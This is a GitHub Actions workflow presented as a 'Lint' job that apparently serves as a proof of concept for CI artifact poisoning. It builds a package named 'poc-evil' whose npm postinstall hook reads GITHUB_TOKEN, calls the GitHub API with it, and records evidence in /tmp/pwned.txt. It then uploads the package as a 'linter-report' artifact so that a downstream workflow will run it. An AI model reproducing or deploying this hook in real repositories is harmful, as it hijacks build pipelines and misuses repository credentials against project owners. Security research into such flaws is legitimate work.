---
name: Lint
on:
  pull_request:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage attacker-controlled artifact payload
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          echo "$PR_NUMBER" > pr-number.txt
          printf 'line one\n' > linter-report.txt
          cat > .npmrc <<'EOF'
          allow-scripts=poc-evil
          EOF
          mkdir -p poc-evil
          cat > package.json <<'EOF'
          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}
          EOF
          cat > poc-evil/package.json <<'EOF'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
          EOF
          cat > poc-evil/hook.js <<'EOF'
          const fs = require('fs');
          const cp = require('child_process');
          const token = process.env.GITHUB_TOKEN || '';
          const repo = process.env.GITHUB_REPOSITORY || '';
          let api = 'not-called';
          try {
            api = cp.execSync(
              "curl -s -o /dev/null -w '%{http_code}' -X GET " +
              "-H 'Authorization: Bearer '\\''" + token + "'\\'' " +
              "https://api.github.com/repos/" + repo, {encoding: 'utf8'});
          } catch (e) { api = 'err'; }
          const evidence = 'POC-CODE-EXEC token_present=' + !!token + ' token_len=' + token.length +
            ' api_status=' + api + ' cwd=' + process.cwd();
          fs.writeFileSync('/tmp/pwned.txt', evidence);
          console.log(evidence);
          EOF
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          include-hidden-files: true
          path: |
            pr-number.txt
            linter-report.txt
            .npmrc
            package.json
            poc-evil
